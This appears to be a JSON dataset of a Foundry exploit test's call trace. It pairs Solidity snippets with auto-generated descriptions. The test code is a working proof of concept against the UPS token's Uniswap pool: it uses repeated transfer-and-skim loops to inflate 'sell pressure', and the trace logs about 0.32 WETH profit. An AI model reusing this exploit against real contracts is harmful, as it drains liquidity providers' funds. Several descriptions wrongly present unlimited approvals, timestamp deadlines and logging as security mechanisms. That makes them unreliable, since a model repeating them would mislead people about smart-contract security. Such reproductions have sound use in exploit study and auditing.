[
    {
        "id": "1052166",
        "args": "",
        "original_code": "    function testExploit() public {\n        // sample attack with 1 ether\n        deal(weth, address(this), 1 ether);\n        address[] memory path = new address[](2);\n        path[0] = weth;\n        path[1] = upsToken;\n\n        IERC20(weth).approve(address(uniRouter), type(uint256).max);\n\n        uniRouter.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])\n\n        console.log(\"prev preassure\", ITokenUPS(upsToken).myPressure(address(this)));\n\n        uint256 balance = IERC20(upsToken).balanceOf(address(this));\n        for (uint256 i; i < 8; ++i) {\n            IERC20(upsToken).transfer(address(lp), balance);\n            lp.skim(address(this));\n        }\n\n        console.log(\"after fake swaps preassure\", ITokenUPS(upsToken).myPressure(address(this)));\n\n        IERC20(upsToken).transfer(address(this), 0);\n\n        path[0] = upsToken;\n        path[1] = weth;\n\n        balance = IERC20(upsToken).balanceOf(address(this));\n        IERC20(upsToken).approve(address(uniRouter), type(uint256).max);\n        uniRouter.swapExactTokensForTokens(balance, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])\n\n        console.log(\"profit!\", IERC20(weth).balanceOf(address(this)) - 1 ether);\n        emit log_named_decimal_uint(\n            \"After exploiting, Attacker WETH Balance\", IERC20(weth).balanceOf(address(this)) - 1 ether, 18\n        );\n    }\n",
        "description": "1. **Core functions**:  \n   The `testExploit` function simulates an attack scenario where it manipulates token balances and pressures in a decentralized exchange (DEX) to generate profit. It starts by allocating 1 ether worth of WETH (Wrapped Ether) to the contract, then swaps WETH for another token (UPS token) using a DEX router. Afterward, it repeatedly transfers UPS tokens to a liquidity pool (LP) and triggers a \"skim\" function to manipulate the token's pressure. Finally, it swaps the manipulated UPS tokens back to WETH to calculate and log the profit generated from the exploit.\n\n2. **Security mechanism**:  \n   - **`approve` function**: Grants unlimited allowance to the DEX router to spend WETH and UPS tokens, ensuring the swap transactions can proceed without restrictions.  \n   - **`block.timestamp`**: Used as a deadline for the swap transactions to prevent them from being executed after a certain time, adding a basic time-based security measure.  \n   - **`console.log` statements**: Used for debugging and logging key values during the exploit, helping to monitor the process.  \n   - **`emit` statement**: Logs the final profit in a structured format for clarity and transparency.  \n\n3. **Parameter Function**:  \n   - **`weth` and `upsToken`**: Represent the addresses of the WETH and UPS tokens involved in the swaps.  \n   - **`uniRouter`**: The address of the DEX router used to execute the token swaps.  \n   - **`lp`**: The address of the liquidity pool where UPS tokens are transferred and manipulated.  \n   - **`path`**: An array of token addresses defining the swap route (e.g., WETH to UPS token and vice versa).  \n   - **`balance`**: Tracks the balance of UPS tokens held by the contract during the exploit.  \n\n4. **Return description**:  \n   The function does not explicitly return a value but calculates and logs the profit generated from the exploit. The profit is determined by comparing the final WETH balance of the contract with the initial 1 ether used in the attack. The difference between these values represents the profit, which is logged and emitted as a decimal value.  \n\n**In summary**, the `testExploit` function demonstrates a simulated attack on a DEX by manipulating token balances and pressures to generate profit. It uses key security mechanisms like `approve` and `block.timestamp` to ensure smooth execution, and it logs the results for analysis. The function relies on parameters like token addresses and the DEX router to perform the exploit, and it calculates the profit by comparing the final WETH balance with the initial investment.",
        "return_value": "Returned"
    },
    {
        "id": "2534",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": "    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n",
        "description": "1. Core functions:  \nThe `balanceOf` function is designed to check and return the token balance of a specific account. It allows users or other contracts to query how many tokens are held by a given address.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it only reads data from the blockchain and does not modify any state. This makes it safe to call without worrying about unintended changes to the contract. Additionally, it is marked as `public`, meaning it can be accessed by anyone, which is typical for balance-checking functions.\n\n3. Parameter Function:  \nThe function takes one parameter, `account`, which is the address of the user or contract whose token balance is being queried. This address is used to look up the corresponding balance in the `_balances` mapping.\n\n4. Return description:  \nThe function returns a `uint256` value, which represents the token balance of the specified `account`. It retrieves this value directly from the `_balances` mapping, which stores the balance of each address.\n\nIn summary,  \nThe `balanceOf` function is a simple and secure way to check the token balance of a specific address. It uses a `view` modifier to ensure it only reads data and takes an `account` address as input to return the corresponding balance from the `_balances` mapping.",
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "534",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]",
        "original_code": null,
        "description": null,
        "return_value": "[0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c], []"
    },
    {
        "id": "0",
        "args": "weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "id": "0",
        "args": "weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "id": "534",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "534",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
    },
    {
        "id": "0",
        "args": "weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000000000000000000",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "0",
        "args": "weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
    },
    {
        "id": "0",
        "args": "weth: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "534",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "1000000000000000000 [1e18]"
    },
    {
        "id": "24420",
        "args": "uniRouterV2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
        "description": "1. **Core functions:**  \n   This function allows the caller (the `msg.sender`) to give permission to another address (`spender`) to spend a specific amount (`value`) of tokens on their behalf. It essentially authorizes the `spender` to transfer tokens from the caller's account up to the specified amount.\n\n2. **Security mechanism:**  \n   - The function uses the `external` modifier, which ensures it can only be called from outside the contract, preventing internal misuse.  \n   - It relies on the `_approve` internal function, which is assumed to handle the actual approval logic securely.  \n   - The function returns `true` to confirm the approval was successful, providing a clear indication of its execution.  \n\n3. **Parameter Function:**  \n   - `spender`: The address of the account that is being granted permission to spend tokens.  \n   - `value`: The maximum amount of tokens the `spender` is allowed to transfer from the caller's account.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval process was completed successfully. This is a straightforward confirmation and does not involve complex calculations.  \n\nIn summary, this function is a simple yet essential part of token management, enabling users to delegate spending permissions to others while ensuring clarity and security in the process.",
        "return_value": "true"
    },
    {
        "id": "90598",
        "args": "1000000000000000000 [1e18], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x35a254223960c18B69C0526c46B013D022E93902], UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1674046451 [1.674e9]",
        "original_code": null,
        "description": null,
        "return_value": "[1000000000000000000 [1e18], 199388836791259039979218 [1.993e23]]"
    },
    {
        "id": "2504",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23], 370977028350625716 [3.709e17], 1609039652 [1.609e9]"
    },
    {
        "id": "8225",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 1000000000000000000 [1e18]",
        "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
        "description": "1. Core functions:  \nThis function allows one address (`from`) to transfer a specified amount of tokens (`value`) to another address (`to`). It is typically used when a third party (the caller) has been granted permission to manage tokens on behalf of the `from` address. The function ensures that the transfer is authorized by checking the allowance granted to the caller.\n\n2. Security mechanism:  \nThe function includes a check to ensure that the caller (`msg.sender`) has sufficient allowance to transfer the tokens. If the allowance is not unlimited (`uint(-1)`), it reduces the allowance by the transferred amount. This prevents unauthorized transfers and ensures that the caller does not exceed their granted permissions.\n\n3. Parameter Function:  \n- `from`: The address from which tokens are being transferred.  \n- `to`: The address receiving the tokens.  \n- `value`: The amount of tokens to be transferred.  \n\nThese parameters define the source, destination, and quantity of the token transfer.\n\n4. Return description:  \nThe function returns `true` to indicate that the transfer was successful. This is a standard practice in such functions to confirm the operation's completion.  \n\nIn summary, this function facilitates authorized token transfers between addresses, ensures the caller has sufficient allowance, and confirms the transfer's success by returning `true`.",
        "return_value": "true"
    },
    {
        "id": "69550",
        "args": "199388836791259039979218 [1.993e23], 0, UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "34652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
        "description": "1. **Core functions:**  \n   - The `transfer` function allows the sender to move a specified amount of tokens from their own account to another account.  \n   - The `transferFrom` function enables a third party (like a smart contract or another user) to move tokens from one account to another, provided they have been granted permission (allowance) by the token owner.  \n\n2. **Security mechanism:**  \n   - Both functions are marked as `external`, meaning they can only be called from outside the contract, ensuring internal state changes are controlled.  \n   - The `transferFrom` function includes a check to ensure the caller has sufficient allowance to transfer the tokens. If the allowance is not unlimited (`uint(-1)`), it deducts the transferred amount from the allowance.  \n   - The `sub` function (likely from a safe math library) prevents underflows, ensuring the allowance cannot go below zero.  \n\n3. **Parameter Function:**  \n   - For `transfer`:  \n     - `to`: The recipient's address where the tokens will be sent.  \n     - `value`: The amount of tokens to transfer.  \n   - For `transferFrom`:  \n     - `from`: The address of the account from which tokens are being transferred.  \n     - `to`: The recipient's address where the tokens will be sent.  \n     - `value`: The amount of tokens to transfer.  \n\n4. **Return description:**  \n   - Both functions return `true` to indicate the transfer was successful. This is a standard practice to confirm the operation completed without errors.  \n\n**In summary,**  \nThe `transfer` function allows direct token transfers between accounts, while `transferFrom` enables delegated transfers with allowance checks. Both functions ensure secure token movements and return `true` upon success.",
        "return_value": "true"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "74191251914853749941792 [7.419e22]"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "6483",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": "    function myPressure(address _address) public view returns(uint256){\n        return amountPressure(sellPressure[_address]);\n    }\n    \n",
        "description": "1. **Core functions**:  \n   The core function `myPressure` is designed to retrieve and return a specific value related to the \"pressure\" associated with a given address. It accesses a data structure (`sellPressure`) that stores pressure values mapped to addresses and uses another function (`amountPressure`) to process and return the final value.\n\n2. **Security mechanism**:  \n   The function includes the `view` modifier, which ensures that it does not modify the state of the contract. This prevents any unintended changes to the contract's data. Additionally, since it only reads data, it is safe from reentrancy attacks or other state-changing vulnerabilities.\n\n3. **Parameter Function**:  \n   The function takes one parameter, `_address`, which is an Ethereum address. This address is used to look up the corresponding pressure value in the `sellPressure` mapping. The parameter essentially acts as a key to fetch the relevant data.\n\n4. **Return description**:  \n   The function returns a `uint256` value, which is calculated by passing the pressure value (retrieved from `sellPressure[_address]`) to the `amountPressure` function. The `amountPressure` function processes this value and returns the final result, which is then output by `myPressure`.\n\nIn summary, the `myPressure` function is a read-only utility that retrieves and processes a pressure value associated with a specific address, ensuring security by not altering the contract's state.",
        "return_value": "0"
    },
    {
        "id": "0",
        "args": "\"prev preassure\", 0",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "199388836791259039979218 [1.993e23]"
    },
    {
        "id": "47385",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "5585",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "5585",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "5585",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "5585",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "5585",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "5585",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "5585",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "37848",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "273580088706112789921010 [2.735e23]"
    },
    {
        "id": "26652",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "3262",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2542",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "66864399287313047715701 [6.686e22]"
    },
    {
        "id": "0",
        "args": "\"after fake swaps preassure\", 66864399287313047715701 [6.686e22]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "98808",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "39272",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 66864399287313047715701 [6.686e22]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "7593",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "7326852627540702226091 [7.326e21]"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "1370977028350625716 [1.37e18]"
    },
    {
        "id": "541",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "199388836791259039979218 [1.993e23]"
    },
    {
        "id": "24665",
        "args": "uniRouterV2: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "92713",
        "args": "199388836791259039979218 [1.993e23], 0, [0x35a254223960c18B69C0526c46B013D022E93902, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1674046451 [1.674e9]",
        "original_code": null,
        "description": null,
        "return_value": "[199388836791259039979218 [1.993e23], 1322242954213069242 [1.322e18]]"
    },
    {
        "id": "504",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "7326852627540702226091 [7.326e21], 1370977028350625716 [1.37e18], 1674046451 [1.674e9]"
    },
    {
        "id": "48116",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34, 199388836791259039979218 [1.993e23]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "36344",
        "args": "0, 1322242954213069242 [1.322e18], UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "23162",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1322242954213069242 [1.322e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "541",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "206715689418799742205309 [2.067e23]"
    },
    {
        "id": "534",
        "args": "0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34",
        "original_code": null,
        "description": null,
        "return_value": "48734074137556474 [4.873e16]"
    },
    {
        "id": "534",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "1322242954213069242 [1.322e18]"
    },
    {
        "id": "0",
        "args": "\"profit!\", 322242954213069242 [3.222e17]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "534",
        "args": "UpswingExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "1322242954213069242 [1.322e18]"
    }
]